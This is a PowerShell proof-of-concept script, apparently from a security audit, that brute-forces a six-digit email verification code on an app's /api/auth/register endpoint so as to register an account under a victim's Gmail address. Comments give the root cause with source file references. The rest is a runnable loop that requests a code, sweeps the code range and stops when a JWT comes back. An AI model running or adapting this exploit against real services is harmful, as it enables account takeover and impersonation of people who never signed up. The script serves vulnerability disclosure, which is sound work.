# PoC #3 — Email verification code brute force -> register an account under
#           someone else's gmail (identity pre-emption / takeover)
#
# Root cause:
#   - Code is a 6-digit number: Random.Shared.Next(0,1_000_000).ToString("D6")
#     (server/Controllers/AuthController.cs:53) -> only 1,000,000 possibilities.
#   - EmailVerificationCode has NO attempt counter (server/Models/EmailVerificationCode.cs).
#   - /api/auth/register has NO rate limiting and NO per-email attempt lock
#     (AuthController.cs:66-117). The whole app has no rate limiter (Program.cs).
#   - Code lifetime is 10 minutes (AuthController.cs:22). 1e6 guesses in 10 min is
#     feasible with modest parallelism; the keyspace is tiny for an online guess.
#
# Attack: victim@gmail.com is NOT yet registered. Attacker triggers /send-code for it
# (the real code is emailed to the victim, attacker never sees it), then brute-forces
# /register with codes 000000..999999 until one succeeds -> attacker now owns an
# account bound to the victim's email and receives a JWT.
#
# EXECUTION STATUS: NOT executed here (no running server/DB, and a full 1e6 sweep is
# slow in a loop). Script is runnable; reduce the range or parallelize for a demo.
# A 1000-guess demo range proves the endpoint neither rate-limits nor locks out.

param(
  [string]$BaseUrl = "http://localhost:5080",
  [string]$Email   = "victim@gmail.com",
  [int]   $Start   = 0,
  [int]   $End      = 1000   # demo window; real attack uses 0..999999
)

# 1) make the server mint+send a code to the victim (attacker does not see it)
Invoke-RestMethod -Uri "$BaseUrl/api/auth/send-code" -Method Post -ContentType "application/json" `
  -Body (@{ email = $Email; nickname = "Attacker" } | ConvertTo-Json) | Out-Null
Write-Host "Requested code for $Email. Starting brute force $Start..$End (no lockout expected)..."

for ($i = $Start; $i -le $End; $i++) {
  $code = $i.ToString("D6")
  $body = @{
    nickname = "Attacker"; gender = "female"; email = $Email; code = $code
    password = "Passw0rd!"; studentType = "none"; isWorking = $false
  } | ConvertTo-Json
  try {
    $resp = Invoke-RestMethod -Uri "$BaseUrl/api/auth/register" -Method Post -ContentType "application/json" -Body $body
    if ($resp.token) {
      Write-Host "SUCCESS at code=$code -> got JWT for hijacked email. token=$($resp.token.Substring(0,20))..."
      break
    }
  } catch {
    # 400 invalid_code => keep going. The point: server keeps answering, never locks out.
  }
  if ($i % 100 -eq 0) { Write-Host "tried $i ..." }
}
